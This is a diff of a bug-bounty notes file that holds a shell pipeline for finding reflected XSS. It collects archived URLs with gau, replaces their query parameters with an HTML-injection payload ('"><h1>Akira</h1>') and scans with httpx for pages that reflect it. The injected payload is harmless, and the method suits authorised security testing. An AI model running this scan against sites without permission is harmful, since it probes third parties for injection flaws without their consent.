@@ -16,7 +16,7 @@
 ## gau+uro+httpx(My Xss)
      cat domains.txt | gau --blacklist 3dm,3ds,3gp,7z,aac,ai,aif,apk,avi,bat,bin,BMP,bz2,cfg,class,CR2,csh,css,csv,dat,deb,dmg,doc,docx,dwg,eot,EPS,exe,EXIF,flac,flv,gba,gdb,gif,gz,HEIC,hqx,ICO,ico,ics,iso,jar,jpeg,jpg,js,json,lua,m4a,m4v,mov,mp3,mp4,msi,NEF,nes,nrg,odp,ods,odt,ogg,ogv,otf,PBM,pdf,PGM,pkg,plist,png,PPM,ppt,pptx,ps,PSD,RAW,rb,rpm,rtf,srt,SVG,svg,swf,sys,tar,TGA,TIFF,ttf,txt,vob,wav,WEBP,webp,woff,woff2,xls,xlsx,xml,xpi,yaml,z64,z7,zip --providers wayback,commoncrawl,otx,urlscan --mt text/html,application/xhtml+xml,application/xml,application/xml+html,application/vnd.wap.xhtml+xml,application/xhtml+xml,text/xml --subs --fp --o domain4xss.txt
 
-     cat domains.txt | uro --filter hasparams | qsreplace %22%3E%3Ch1%3EAkira%3C%2Fh1%3E > domain4httpx.txt
+     cat domains.txt | uro --filter hasparams | qsreplace '"><h1>Akira</h1>' > domain4httpx.txt
 
      cat domain4httpx.txt | httpx -ms "<h1>Akira</h1>" -ct -t 200 -o bounty.txt
 
